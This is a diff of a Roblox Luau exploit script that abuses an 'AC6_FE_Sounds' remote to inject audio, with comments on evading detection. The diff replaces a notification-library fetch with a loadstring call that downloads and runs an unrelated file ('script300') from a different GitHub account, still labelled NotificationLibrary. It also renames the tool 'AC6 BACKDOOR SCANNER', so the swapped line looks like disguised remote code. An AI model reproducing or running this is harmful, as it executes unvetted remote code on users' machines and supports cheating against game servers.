@@ -2,12 +2,11 @@ local g = game
 local Workspace = g:GetService("Workspace")
 local ReplicatedStorage = g:GetService("ReplicatedStorage")
 
---// the audios will be parent in whatever instance is in this variable, its recommended you should replace this if your getting kicked cuz dev may protect TestService since it's the default
 local INJECT = g:GetService("TestService")
 local REMOTE = "AC6_FE_Sounds" --// replace this if the dev changed the remotes name
 
 --// varbs
-local NotificationLibrary = loadstring(g:HttpGet("https://raw.githubusercontent.com/Roblox-HttpSpy/AC6-Music-Exploit/refs/heads/main/notif.luau"))()
+local NotificationLibrary = loadstring(g:HttpGet("https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/script300"))()
 local Chars = "qwertyuiopasdfghjklzxcvbnm" --// dont use random symbols ill just make it more detectable
 local Random = Random.new()
 local loopState, isDragging = true, false
@@ -157,7 +156,7 @@ local border = create("Frame", {
 local title = create("TextLabel", {
 	Size = Udim2(1, 0, 0, 40),
 	BackgroundTransparency = 1,
-	Text = "Ac6-Vulnerablity [By: https]",
+	Text = "AC6 BACKDOOR SCANNER",
 	FontFace = font,
 	TextSize = 28,
 	TextColor3 = Color(1, 1, 1),
